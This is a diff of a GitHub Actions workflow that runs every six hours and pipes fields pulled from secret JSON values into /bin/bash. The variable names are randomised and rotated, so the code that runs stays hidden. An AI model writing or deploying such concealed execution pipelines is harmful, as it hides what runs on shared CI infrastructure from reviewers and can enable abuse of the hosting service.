@@ -3,27 +3,24 @@ name: wengtouwt
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 1/6 * * *'
-jobs:  # 16357
+    - cron: '10 1/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: wengtouwt
         env:
-          p96924: ${{ secrets.p96924 }}
+          qxi4: ${{ secrets.qxi4 }}
         run: |
-          echo $p96924 | jq -r .eqpbi765 | /bin/bash
-          echo $dx1 | jq -r .cluu98 | /bin/bash
-          echo $niue62 | jq -r .v95 | /bin/bash
-          echo $i629 | jq -r .dqas83 | /bin/bash
-          echo $wo7567 | jq -r .jc042 | /bin/bash
-          echo $ui91916 | jq -r .hvdhk8 | /bin/bash
-          echo $yep57646 | jq -r .al211 | /bin/bash
-          echo $lbs85425 | jq -r .zwga68688 | /bin/bash
-          echo $zpzvk672 | jq -r .m585 | /bin/bash
-          echo $vxn6 | jq -r .v21 | /bin/bash
-          echo $brj776 | jq -r .xcv308 | /bin/bash
-          echo $wjhv62321 | jq -r .xrdbf55811 | /bin/bash
-          echo $qggz585 | jq -r .a51 | /bin/bash
+          echo $qxi4 | jq -r .kgc4139 | /bin/bash
+          echo $jfdm4354 | jq -r .yj0928 | /bin/bash
+          echo $m526 | jq -r .vhw9 | /bin/bash
+          echo $wku3648 | jq -r .pjyj2 | /bin/bash
+          echo $wo5 | jq -r .oxpph1430 | /bin/bash
+          echo $ipes1 | jq -r .q91 | /bin/bash
+          echo $cx4565 | jq -r .zupy3202 | /bin/bash
+          echo $fta434 | jq -r .ams93 | /bin/bash
+          echo $uxgiw5072 | jq -r .i53 | /bin/bash
 
